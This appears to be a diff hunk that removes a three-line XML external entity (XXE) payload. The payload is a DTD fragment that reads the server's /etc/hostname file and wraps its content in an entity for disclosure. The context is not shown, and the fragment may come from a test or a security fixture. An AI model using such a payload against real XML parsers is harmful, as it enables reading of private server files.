@@ -1,3 +1,0 @@
-<!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % eval "<!ENTITY send 'file_content:%file;'>">
-%eval;
